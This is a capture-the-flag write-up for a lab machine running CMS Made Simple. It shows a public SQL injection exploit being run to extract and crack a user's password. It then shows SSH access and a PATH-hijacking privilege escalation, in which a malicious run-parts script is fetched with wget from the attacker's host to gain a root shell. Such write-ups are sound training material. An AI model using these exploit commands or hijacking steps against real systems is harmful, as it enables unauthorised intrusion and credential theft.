# Writeup

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:25 EDT
Nmap scan report for 10.129.95.203
Host is up (0.14s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Port 80 -> SQL Injection

Port 80 just hosts this image:

<figure><img src="../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

This thing says that it is banning IPs that send too many requests, so a directory scan might be counterproductive. Instead, based on the text, going to `/writeup` works.&#x20;

<figure><img src="../../../.gitbook/assets/image (843).png" alt=""><figcaption></figcaption></figure>

Viewing the page source reveals that this is using CMS Made Simple:

<figure><img src="../../../.gitbook/assets/image (2745).png" alt=""><figcaption></figcaption></figure>

There are loads of exploits for this software.

```
$ searchsploit made simple
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Cod | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting    | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion    | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection     | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vu | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities          | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection       | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File  | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion               | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure              | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site  | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities           | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery           | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclus | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Re | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Sid | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities           | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution              | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authentica | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Uplo | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting ( | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)               | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via S | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execut | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execut | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Pois | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                   | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File  | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) A | php/webapps/46546.py
----------------------------------------------------------- ---------------------------------
```

I tried a few of them, and only the SQL Injection one worked.&#x20;

```
$ python3 46635.py -u http://10.129.95.203/writeup --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

With this, we can `ssh` in as `jkr`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2184).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### PATH Hijacking

I ran a LinPEAS scan to enumerate for me, which found that we are part of the `staff` group that can write to certain directories:

```
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
Group staff:
/usr/local/bin
/usr/local/games
/usr/local/sbin
<TRUNCATED>
```

Having write access to these directories means that we can do PATH hijacking by creating an executable in those files with the same name as processes run by `root`. As such, I downloaded `pspy64` onto the machine to see if `root` was running any processes without full paths.&#x20;

When run, I saw these processes that were run:

```
2023/05/06 05:02:16 CMD: UID=0    PID=12903  | run-parts --lsbsysinit /etc/update-motd.d 
2023/05/06 05:02:16 CMD: UID=0    PID=12904  | /bin/sh /etc/update-motd.d/10-uname
```

The `run-parts` command did not have a full path, meaning that we can exploit this. We can create a basic `bash` script that makes `/bin/bash` an SUID binary. Then we can download it into the `/usr/local/bin` directory:

```
jkr@writeup:/usr/local/bin$ wget 10.10.14.13:8000/run-parts
--2023-05-06 05:03:51--  http://10.10.14.13:8000/run-parts
Connecting to 10.10.14.13:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [application/octet-stream]
Saving to: ‘run-parts’

run-parts               100%[============================>]      32  --.-KB/s    in 0s      

2023-05-06 05:03:51 (6.62 MB/s) - ‘run-parts’ saved [32/32]

jkr@writeup:/usr/local/bin$ chmod +x run-parts
```

Afterwards, we just need to `ssh` back into the machine to execute it and get a `root` shell.

<figure><img src="../../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>
